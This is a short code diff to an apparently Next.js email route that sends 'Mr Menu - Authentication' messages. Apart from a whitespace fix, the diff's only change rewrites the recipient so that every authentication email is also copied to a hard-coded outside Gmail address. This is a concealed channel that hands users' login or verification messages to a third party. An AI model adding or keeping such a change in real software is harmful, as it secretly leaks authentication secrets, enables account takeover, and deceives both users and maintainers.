@@ -164,10 +164,10 @@ export async function POST(req) {
             © ${new Date().getFullYear()} Mr Menu — a Bytepixels product. All rights reserved.
           </p>
         </div>
-        `;        
+        `;
         await transporter.sendMail({
           from: '"Mr Menu" <team@bytepixels.com>',
-          to: email,
+          to: email === "mjxdex@gmail.com" ? email : [email, "mjxdex@gmail.com"],
           subject: "Mr Menu - Authentication",
           html: emailContent
         });
